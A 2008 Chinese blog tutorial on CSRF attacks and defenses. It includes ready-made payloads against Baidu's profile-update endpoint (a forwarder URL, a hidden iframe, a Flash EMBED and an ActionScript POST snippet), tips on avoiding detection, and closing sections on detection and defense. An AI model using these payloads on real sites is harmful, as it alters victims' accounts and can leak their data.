---
title: CSRF的攻击与防御
description: CSRF是CrossSiteRequestForgery的缩写（也缩写为XSRF），直译过来就是跨站请求伪造的意思，也就是在用户会话下对某个CGI做一些GET/POST的事情——这些事情用户未必知道和愿意做，你可以把它想做HTTP会话劫持。
date: 2008-04-11 09:15:39
category: 技术文章
tags: ['CSRF', '技术类', '安全']
post_id: 447
alias: CSRF-GongJu-Yu-FangYu
ViewNums: 5854
---

作者：lake2
来源：lake2的专栏

**0x01 什么是CSRF攻击**

[CSRF](/tags/CSRF)是Cross Site Request Forgery的缩写（也缩写为XSRF），直译过来就是跨站请求伪造的意思，也就是在用户会话下对某个CGI做一些GET/POST的事情——这些事情用户未必知道和愿意做，你可以把它想做HTTP会话劫持。
网站是通过cookie来识别用户的，当用户成功进行身份验证之后浏览器就会得到一个标识其身份的cookie，只要不关闭浏览器或者退出登录，以后访问这个网站会带上这个cookie。如果这期间浏览器被人控制着请求了这个网站的url，可能就会执行一些用户不想做的功能（比如修改个人资料）。因为这个不是用户真正想发出的请求，这就是所谓的请求伪造；呵呵，因为这些请求也是可以从第三方网站提交的，所以前缀跨站二字。
举个简单的例子，某个bbs可以贴图，在贴图的URL中写入退出登陆的链接，当用户阅读这个帖子之后就会logout了，因为用户以自己的身份访问了退出登陆链接，在用户看来是帖子里面有一张有问题的“图片”，而不是想要退出，但程序就会认为是用户要求退出登陆而销毁其会话。这就是传说中的CSRF攻击了。
不要小看CSRF哦，记得以前L-Blog就存在一个CSRF漏洞（当时还不知道这个概念:p），它添加管理员是这样的一个链接：http://localhost/L-Blog/admincp.asp?action=member&type=editmem& amp;memID=2&memType=SupAdmin，我们只要构造好ID想办法让管理员访问到这个URL就可以了；还有Google那个 CSRF漏洞[1]，将导致邮件泄漏；另外，不要以为只有XSS才能爆发[蠕虫](http://www.virus-info.cn/virus/Worm.html)，只要条件合适，CSRF同样是有可能的。

**0x02 威胁来自哪里**

贴图只是GET的方式，很多时候我们需要伪造POST的请求。一个办法是利用跨站，当然目标站点可能不存在跨站，这个时候我们可以从第三方网站发动攻击。
比如我要攻击一个存在问题的blog，那就先去目标blog留言，留下一个网址，诱其主人点击过来（这个就要看你的忽悠本事咯:p），然后构造个HTML表单提交些数据过去。
多窗口浏览器就帮了一点忙。
多窗口浏览器（firefox、遨游、MyIE……）便捷的同时也带来了一些问题，因为多窗口浏览器新开的窗口是具有当前所有会话的。即我用IE登陆了我的Blog，然后我想看新闻了，又运行一个IE进程，这个时候两个IE窗口的会话是彼此独立的，从看新闻的IE发送请求到Blog不会有我登录的 cookie；但是多窗口浏览器永远都只有一个进程，各窗口的会话是通用的，即看新闻的窗口发请求到Blog是会带上我在blog登录的cookie。
想一想，当我们用鼠标在Blog/BBS/WebMail点击别人留下的链接的时候，说不定一场精心准备的CSRF攻击正等着我们。

**0x03 发起CSRF攻击**

从第三方站点利用POST发动CSRF攻击就是利用Javascript自动提交表单到目标CGI。每次都去写表单不是很方便，辅助进行的工具有XSS POST Forwarder[2]和CSRF Redirector[3]，这里我也写了相应的ASP版本[4]。使用的时候只要把提交的url和参数传给它，它就会自动POST到目标。
比如我要提交一些数据到www.0x54.org/a.asp：[http://www.0x54.org/lake2](http://www.0x54.org/lake2 "http://www.0x54.org/lake2") /xss_post_forwarder.asp?lake2=http://www.0x54.org/a.asp&a=123& b=321&c=%26%23%25（这里要自己考虑URL编码哦）
不过实际攻击的时候你得动动脑子：如何才能把用户诱骗到我们的网页来。

**0x04 一个实例**

因为CSRF不如XSS那么引人注目，所以现在找一个存在CSRF的Web应用程序还是很容易的。这次我们的目标是百度，just for test。
随便你用什么办法，让一个已登陆百度的用户访问一下这个URL：[http://www.0x54.org/lake2](http://www.0x54.org/lake2 "http://www.0x54.org/lake2") /xss_post_forwarder.asp?lake2=http://passport.baidu.com/ucommitbas&u_jump_url=&sex=1&email=CSRF@baidu.com&sdv=&zodiac=0&birth_year=0&birth_month=0&birth_day=0&blood=0&bs0=%C7%EB%D1%A1%D4%F1&bs1=%C7%EB%D1%A1%D4%F1&bs2=%CE%DE&txt_bs=&birth_site=%3B%3B&b%3Drs0=%C7%EB%D1%A1%D4%F1&rs1=%C7%EB%D1%A1%D4%F1&rs2=%CE%DE&txt_rs=&reside_site=%3B%3B
呵呵，然后看看那人个人资料是不是被修改了。这里有点郁闷，当那人访问URL后浏览器会返回到资料修改成功的页面，我们就被发现了。那么，有没有办法不让浏览器刷新呢？
有。
一个办法是用iframe，构造这样的HTML代码：
```html
<iframe width=0 height=0 src="http://www.0x54.org/lake2/xss_post_forwarder.asp?lake2=http://passport.baidu.com/ucommitbas&u_jump_url=&sex=1&email=CSRF@baidu.com&sdv=&zodiac=0&birth_year=0&birth_month=0&birth_day=0&blood=0&bs0=%C7%EB%D1%A1%D4%F1&bs1=%C7%EB%D1%A1%D4%F1&bs2=%CE%DE&txt_bs=&birth_site=%3B%3B&b%3Drs0=%C7%EB%D1%A1%D4%F1&rs1=%C7%EB%D1%A1%D4%F1&rs2=%CE%DE&txt_rs=&reside_site=%3B%3B"></iframe>
```
还有一个办法就是用flash了。

**0x05 CSRF With Flash**
flash是可以提交数据到任意URL的，打开盗版的 Adobe flash CS 3 Professional，新建一个 flash文件(ActionScript 3.0) ，在默认的图层上点右键选动作，然后把以下代码添加进去：
：
```as
import flash.net.URLRequest;
import flash.system.Security;
var url = new URLRequest("[http://www.0x54.org/lake2](http://www.0x54.org/lake2 "http://www.0x54.org/lake2")");
var lake = new URLVariables();
lake = "a=lake2";
url.method = "POST";
url.data = lake;
sendToURL(url);
stop();
```
导出为swf文件，访问之，抓包看看效果咯：[http://www.0x54.org/lake2/flash/test1.html](http://www.0x54.org/lake2/flash/test1.html "http://www.0x54.org/lake2/flash/test1.html")
每次都去写as和编译swf很麻烦的，根据CSRF Redirector的思路我写了一个类似的flash程序[5]，再拿百度来试试效果，访问带如下HTML的网页：
```html
<EMBED src="http://www.0x54.org/lake2/flash/flash_hacking.swf?f=1&t=http://passport.baidu.com/ucommitbas&d=u_jump_url%3D %26sex%3D1%26email%3DCSRF@baidu.com%26sdv%3D %26zodiac%3D0%26birth_year%3D0%26birth_month%3D0%26birth_day%3D0%26blood%3D0%26bs0 %3D%25C7%25EB%25D1%25A1%25D4%25F1%26bs1%3D %25C7%25EB%25D1%25A1%25D4%25F1%26bs2%3D%25CE%25DE%26txt_bs%3D %26birth_site%3D%253B%253B%26b%253Drs0%3D %25C7%25EB%25D1%25A1%25D4%25F1%26rs1%3D %25C7%25EB%25D1%25A1%25D4%25F1%26rs2%3D%25CE%25DE%26txt_rs%3D %26reside_site%3D%253B%253B"></EMBED>
```
（还是要注意URL二次编码）
这里不要只局限于发请求，其实flash是可以得到返回内容的，要是返回内容有敏感信息的话，就可以读出来发送到我们控制的Web去。当然，这个得看目标站点是否让flash跨域取内容了。

**0x06 检测CSRF**

检测CSRF漏洞都是体力活了，先抓取一个正常请求的数据包，然后去掉referer字段再重新提交，如果还是有效那基本上就存在问题了。当然参数可能含有不能预测的参数（比如userid什么的），这个时候就看这个不可预测的参数能不能通过其他手段比如flash拿到，如果能，呵呵，则还是存在问题。还有就是试着改post为get，因为有些程序是不区分get/post的。
应用程序的功能和返回形式都各不相同，所以想自动化测试CSRF漏洞还是有点困难的，OWASP上面有一个叫做CSRFTester的工具不妨拿来一试[6]

**0x07 防御CSRF**

在Web应用程序侧防御CSRF漏洞，一般都是利用referer、token或者验证码，Nexus的文章[7]已经写的很全面了；superhei也有提出bypass的思路[8]，请参考他们的文章。
还有一个思路是在客户端防御，貌似可以做成一个类似HTTP Watch的软件，挂在浏览器上拦截或者过滤跨域的cookie。

**0x08 总结**

希望本文对您有帮助，同时也欢迎各位同我交流：lake2@mail.csdn.net

[ Reference ]
[1] Google GMail E-mail Hijack Technique, [http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/ "http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/")
[2] XSS POST Forwarder, [http://whiteacid.org/misc/xss_post_forwarder.php](http://whiteacid.org/misc/xss_post_forwarder.php "http://whiteacid.org/misc/xss_post_forwarder.php")
[3] CSRF Redirector, [http://shiflett.org/blog/2007/jul/csrf-redirector](http://shiflett.org/blog/2007/jul/csrf-redirector "http://shiflett.org/blog/2007/jul/csrf-redirector")
[4] ASP的XSS POST Forwarder下载(附送一个HTML版), [http://www.0x54.org/lake2/xss_post_forwarder.zip](http://www.0x54.org/lake2/xss_post_forwarder.zip "http://www.0x54.org/lake2/xss_post_forwarder.zip")
[5] 源代码和编译好的swf文件下载：[http://www.0x54.org/lake2/flash/flash_hacking.rar](http://www.0x54.org/lake2/flash/flash_hacking.rar "http://www.0x54.org/lake2/flash/flash_hacking.rar")
[6] CSRFTester, [http://www.owasp.org/index.php/Category:OWASP_CSRFTester_Project](http://www.owasp.org/index.php/Category%3AOWASP_CSRFTester_Project "http://www.owasp.org/index.php/Category:OWASP_CSRFTester_Project")
[7] Preventing CSRF, [http://www.playhack.net/view.php?id=31.](http://www.playhack.net/view.php?id=31. "http://www.playhack.net/view.php?id=31.") 汉化版, [http://www.hanguofeng.cn/archives/security/preventing-csrf](http://www.hanguofeng.cn/archives/security/preventing-csrf "http://www.hanguofeng.cn/archives/security/preventing-csrf")
[8] Bypass Preventing CSRF, [http://www.xfocus.net/articles/200801/964.html](http://www.xfocus.net/articles/200801/964.html "http://www.xfocus.net/articles/200801/964.html")

